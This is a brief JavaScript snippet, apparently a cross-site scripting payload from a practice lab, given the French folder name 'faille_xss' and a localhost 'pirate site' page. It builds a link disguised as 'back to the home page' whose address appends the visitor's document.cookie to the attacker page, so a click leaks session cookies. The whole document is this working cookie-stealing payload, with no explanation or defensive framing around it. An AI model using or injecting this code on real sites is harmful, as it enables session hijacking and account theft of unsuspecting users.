<script>
let myAnchor = document.createElement("a");

      let textToLink = document.createTextNode("retour a la page daccueil");

      myAnchor.appendChild(textToLink);
	
      myAnchor.href = "http://localhost/mes_site_web/Js/faille_xss/pagedusitepirate.php?cookies=";
      myAnchor.href += document.cookie ;
      document.body.appendChild(myAnchor);
</script>